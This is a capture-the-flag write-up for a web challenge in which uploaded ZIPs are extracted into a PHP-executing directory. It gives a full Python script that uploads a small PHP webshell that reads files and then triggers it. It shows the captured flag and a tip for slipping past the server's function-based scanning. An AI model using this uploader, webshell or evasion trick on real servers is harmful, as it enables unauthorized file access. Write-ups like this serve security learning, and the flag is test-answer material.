---
title: "PathTraversal++"
ctf: "CyberStrike CTF"
date: 2026-07-11
category: web
difficulty: very-hard
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# PathTraversal++

## Summary

FileVault is a PHP archive extraction service that extracts uploaded ZIPs into a web-accessible `uploads/` directory. Despite the "Zip Slip" framing and path-traversal pre-scan, Apache executes `.php` files placed in `uploads/`, so a trivial PHP webshell dropped via a legit (non-traversal) ZIP entry gives immediate file read and the flag at `/flag`.

## Solution

### Step 1: Upload a tiny PHP reader as a normal ZIP entry

The server blocks any entry whose name contains `../`, but a plain `f.php` entry passes the pre-scan and lands in `/var/www/html/uploads/`, where Apache+PHP happily executes it. No path traversal needed — the "escape" is that the extraction target is itself a code-execution directory.

```python
import zipfile, io, requests, re

URL = "http://chal.csc-snist.live:51388/"

# Tiny PHP that tries a list of common flag paths with file_get_contents.
php = """<?php $p=['/flag','/flag.txt','/root/flag.txt','/home/ctf/flag','/opt/flag','/srv/flag','/app/flag.txt','/var/www/flag.txt','/var/www/html/flag.txt','/var/www/html/flag','/var/flag','/tmp/flag','/etc/flag'];
foreach($p as $x){$c=@file_get_contents($x);if($c!==false){echo "$x => $c\\n";}}echo "DONE";"""

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('f.php', php)
payload = buf.getvalue()

# Upload
r = requests.post(URL, files={'zipfile': ('f.zip', payload, 'application/zip')}, timeout=20)
assert 'Extracted: f.php' in r.text, r.text

# Trigger the dropped PHP and read the flag
out = requests.get(URL + 'uploads/f.php', timeout=20).text
flag = re.search(r'cyberstrike\{[^}]*\}', out).group(0)
print(out)
print("[+]" + flag)
```

Actual output:

```
/flag => cyberstrike{fa432de1bc8cc8c604b3a4be464cffee}
DONE
```

### Step 2: Note on the dead end

Attempts to use `shell_exec` / `scandir` / `system` inside the dropped PHP caused the upload response to hang (the server-side pre-scan/AV appears to flag those functions). Using only `file_get_contents` with an explicit path list sailed through, which was enough since the flag was at `/flag`.

## Flag

```
cyberstrike{fa432de1bc8cc8c604b3a4be464cffee}
```